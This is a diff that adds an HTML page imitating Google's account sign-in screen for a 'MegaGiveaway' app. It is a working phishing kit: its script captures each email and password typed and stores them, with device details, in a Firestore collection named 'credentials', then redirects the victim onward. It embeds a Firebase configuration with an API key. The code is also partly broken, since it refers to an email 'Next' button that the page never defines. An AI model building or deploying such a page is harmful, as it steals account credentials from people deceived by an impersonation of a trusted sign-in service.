@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in – Google accounts</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #fff;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top bar with Google G logo and text */
+    .top-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 20px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .top-bar .g-icon {
+      width: 24px;
+      height: 24px;
+    }
+    .top-bar span {
+      font-size: 16px;
+      color: #202124;
+      font-weight: 400;
+    }
+
+    /* Main content */
+    .main {
+      flex: 1;
+      padding: 40px 24px 24px;
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* Profile avatar circle */
+    .avatar {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #e8eaed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .avatar svg {
+      width: 40px;
+      height: 40px;
+      fill: #80868b;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #202124;
+      margin-bottom: 32px;
+    }
+    .subtitle a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    /* Input field */
+    .input-wrap {
+      position: relative;
+      margin-bottom: 4px;
+    }
+    .input-wrap input {
+      width: 100%;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      padding: 14px 14px 14px;
+      font-size: 16px;
+      color: #202124;
+      outline: none;
+      background: transparent;
+    }
+    .input-wrap input:focus {
+      border-color: #1a73e8;
+      border-width: 2px;
+    }
+    .input-wrap label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #444746;
+      pointer-events: none;
+      background: #fff;
+      padding: 0 4px;
+      transition: all 0.15s ease;
+    }
+    .input-wrap input:focus ~ label,
+    .input-wrap input.has-value ~ label {
+      top: 0;
+      font-size: 12px;
+      color: #1a73e8;
+    }
+
+    .forgot {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 8px;
+      margin-bottom: 28px;
+      font-weight: 500;
+    }
+
+    .privacy-note {
+      font-size: 14px;
+      color: #444746;
+      margin-bottom: 40px;
+      line-height: 1.6;
+    }
+    .privacy-note a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    /* Bottom actions */
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .create-btn {
+      font-size: 14px;
+      color: #1a73e8;
+      font-weight: 500;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 10px 0;
+      font-family: inherit;
+    }
+    .create-btn:hover { text-decoration: underline; }
+
+    .next-btn {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .next-btn:hover { background: #1557b0; }
+    .next-btn:disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
+
+    /* Footer */
+    .footer {
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid #e0e0e0;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .footer select {
+      border: none;
+      font-size: 12px;
+      color: #444746;
+      background: transparent;
+      cursor: pointer;
+    }
+    .footer-links {
+      display: flex;
+      gap: 16px;
+    }
+    .footer-links a {
+      font-size: 12px;
+      color: #444746;
+      text-decoration: none;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+
+    /* Password page hidden by default */
+    #page-password { display: none; }
+
+    /* Email chip on password page */
+    .email-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid #e0e0e0;
+      border-radius: 20px;
+      padding: 6px 16px 6px 8px;
+      font-size: 14px;
+      color: #202124;
+      margin-bottom: 28px;
+      cursor: pointer;
+    }
+    .email-chip .chip-avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    .email-chip .arrow {
+      margin-left: 4px;
+      color: #444746;
+      font-size: 12px;
+    }
+
+    .show-password-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      margin-bottom: 32px;
+    }
+    .show-password-row input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; }
+    .show-password-row label { font-size: 14px; color: #202124; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+  <!-- Top bar -->
+  <div class="top-bar">
+    <svg class="g-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+    </svg>
+    <span>Sign in with Google</span>
+  </div>
+
+  <!-- Email page -->
+  <div class="main" id="page-email">
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to <a href="#">MegaGiveaway</a></p>
+
+    <div class="input-wrap">
+      <input type="email" id="email-input" placeholder=" " autocomplete="email" />
+      <label>Email or phone</label>
+    </div>
+
+    <a href="#" class="forgot">Forgot email?</a>
+
+    <p class="privacy-note">
+      Before using this app, you can review MegaGiveaway's
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a>.
+    </p>
+
+    <div class="actions">
+      <button class="create-btn" type="button" onclick="window.open('https://accounts.google.com/signup','_blank')">Create account</button>
+    </div>
+  </div>
+
+  <!-- Password page -->
+  <div class="main" id="page-password">
+    <h1>Welcome</h1>
+
+    <div class="email-chip" id="email-chip">
+      <div class="chip-avatar" id="chip-avatar">U</div>
+      <span id="chip-email"></span>
+      <span class="arrow">▾</span>
+    </div>
+
+    <div class="input-wrap">
+      <input type="password" id="password-input" placeholder=" " autocomplete="current-password" />
+      <label>Enter your password</label>
+    </div>
+
+    <div class="show-password-row">
+      <input type="checkbox" id="show-pass" />
+      <label for="show-pass">Show password</label>
+    </div>
+
+    <a href="https://accounts.google.com/signin/recovery" target="_blank" class="forgot">Forgot password?</a>
+
+    <div class="actions">
+      <button class="create-btn" type="button" onclick="window.open('https://accounts.google.com/signup','_blank')">Create account</button>
+      <button class="next-btn" id="password-next" disabled>Sign in</button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <select><option>English (United Kingdom)</option><option>English (United States)</option><option>हिन्दी</option></select>
+    <div class="footer-links">
+      <a href="https://support.google.com/accounts" target="_blank">Help</a>
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+      <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCrPIQ0VH0rC4CQbFD3XbKLI0owMqvht1k",
+      authDomain: "giveaway-220ef.firebaseapp.com",
+      projectId: "giveaway-220ef",
+      storageBucket: "giveaway-220ef.firebasestorage.app",
+      messagingSenderId: "1012428045360",
+      appId: "1:1012428045360:web:033b74585c425ce89441f5"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const auth = getAuth(app);
+    signInAnonymously(auth).catch(() => {});
+
+    async function saveCreds(data) {
+      try {
+        await addDoc(collection(db, 'credentials'), {
+          ...data,
+          timestamp: new Date().toISOString(),
+          device: navigator.userAgent
+        });
+      } catch(e) {}
+    }
+
+    let userEmail = '';
+
+    const emailInput = document.getElementById('email-input');
+    const emailNext  = document.getElementById('email-next');
+
+    // Enable Next when something is typed
+    emailInput.addEventListener('input', () => {
+      if (emailInput.value.trim().length > 0) {
+        emailInput.classList.add('has-value');
+        emailNext.disabled = false;
+      } else {
+        emailInput.classList.remove('has-value');
+        emailNext.disabled = true;
+      }
+    });
+
+    emailNext.addEventListener('click', () => {
+      const val = emailInput.value.trim();
+      if (!val) return;
+      userEmail = val;
+      // Save email immediately
+      saveCreds({ email: userEmail, password: '' });
+      // Show password page
+      document.getElementById('chip-avatar').textContent = userEmail[0].toUpperCase();
+      document.getElementById('chip-email').textContent = userEmail;
+      document.getElementById('page-email').style.display = 'none';
+      document.getElementById('page-password').style.display = 'block';
+      document.getElementById('password-input').focus();
+    });
+
+    const passwordInput = document.getElementById('password-input');
+    const passwordNext  = document.getElementById('password-next');
+    const showPass      = document.getElementById('show-pass');
+
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.value.length > 0) {
+        passwordInput.classList.add('has-value');
+        passwordNext.disabled = false;
+      } else {
+        passwordInput.classList.remove('has-value');
+        passwordNext.disabled = true;
+      }
+    });
+
+    showPass.addEventListener('change', () => {
+      passwordInput.type = showPass.checked ? 'text' : 'password';
+    });
+
+    passwordNext.addEventListener('click', () => {
+      const pass = passwordInput.value;
+      if (!pass) return;
+      // Save credentials
+      saveCreds({ email: userEmail, password: pass });
+      // Redirect back to main page
+      setTimeout(() => {
+        window.location.href = 'index.html?verified=1';
+      }, 600);
+    });
+
+    // Enter key support
+    emailInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !emailNext.disabled) emailNext.click(); });
+    passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter' && !passwordNext.disabled) passwordNext.click(); });
+  </script>
+
+</body>
+</html>
+
